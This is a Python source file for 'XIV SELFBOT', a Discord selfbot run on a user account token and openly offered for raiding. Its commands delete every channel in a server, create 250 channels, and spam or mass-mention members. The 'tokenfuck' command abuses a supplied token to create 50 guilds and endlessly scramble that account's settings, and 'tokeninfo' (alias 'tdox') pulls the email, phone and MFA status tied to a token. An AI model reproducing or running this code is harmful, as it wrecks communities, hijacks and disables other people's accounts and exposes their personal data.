import discord, json
import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4
from sys import stdout

import aiohttp
import colorama
import discord
import numpy
import time
import ctypes
import threading
import requests
from threading import Thread
from PIL import Image
from colorama import Fore, init, Style
from discord import Permissions
from discord.ext import commands
from discord.utils import get
from gtts import gTTS
from requests import Session
from time import strftime, gmtime
from discord.ext import commands

ctypes.windll.kernel32.SetConsoleTitleW(f"XIV SELFBOT")

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


for i in range(3):
    print(f'Welcome User{Fore.MAGENTA}[•]{Style.RESET_ALL}')
    time.sleep(0.4)
    os.system('cls')
    print(f'Welcome User{Fore.MAGENTA}[••]{Style.RESET_ALL}')
    time.sleep(0.4)
    os.system('cls')
    print(f'Welcome User{Fore.MAGENTA}[•••]{Style.RESET_ALL}')
    time.sleep(0.4)
    os.system('cls')
    print(f'Welcome User{Fore.MAGENTA}[••••]{Style.RESET_ALL}')
    time.sleep(0.4)
    os.system('cls')

print("Loading...")
time.sleep(0.8)
os.system('cls')

print(f'''{Fore.MAGENTA}
                  
                                                                                                
                                            ═╗ ╦ ╦ ╦  ╦                  
                                            ╔╩╦╝ ║ ╚╗╔╝                  
                                            ╩ ╚═ ╩  ╚╝
                              
                              Join our discord!! : {Fore.GREEN}https://discord.gg/GjKgjBXBxm{Fore.RESET}                      
                              {Fore.MAGENTA}Prefix : {Fore.GREEN};
    ''' + Fore.RESET)
            

xiv = commands.Bot(description="XIV SELFBOT", command_prefix=";", self_bot=True)
xiv.remove_command("help")


@xiv.command(aliases=["delchannel"])
async def delc(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@xiv.command(aliases=["masschannels", "masschannel", "ctc"])
async def massc(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="XIV WIZZED YOU!!!")
        except:
            return

@xiv.command()
async def token(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@xiv.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def gicon(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@xiv.command()
async def glee(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == xiv.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == xiv.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass

@xiv.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "XIV NUKED YOU",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@xiv.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    # em.set_footer(text=_token)
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@xiv.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)


@xiv.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        print(list(ctx.guild.members))
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)

@xiv.command()
async def help(ctx):
    embed = discord.Embed(color = discord.Color(0xFF0000))
    embed.set_author(name="XIV RUNS CORD")
    embed.add_field(name="General Commands", value="tokenfuck, tokeninfo, massc, delc, gicon, glee",inline=False)
    embed.set_footer(text="XIV ON TOP")
    embed.set_image(url="https://images-ext-2.discordapp.net/external/mEuQrlwnd7aBffyRgcuGwg_7TrfoqUgrwoQO1rqcK4M/%3Fsize%3D1024/https/cdn.discordapp.com/icons/792133991821606912/a_997ddddd43553e1482cbbf31b74681e9.gif")
    embed.set_thumbnail(url='https://images-ext-2.discordapp.net/external/mEuQrlwnd7aBffyRgcuGwg_7TrfoqUgrwoQO1rqcK4M/%3Fsize%3D1024/https/cdn.discordapp.com/icons/792133991821606912/a_997ddddd43553e1482cbbf31b74681e9.gif')
    await ctx.send(embed=embed,delete_after=30)

with open('./config.json') as f:
    config = json.load(f)

token = config.get('token')
xiv.run(token, bot=False)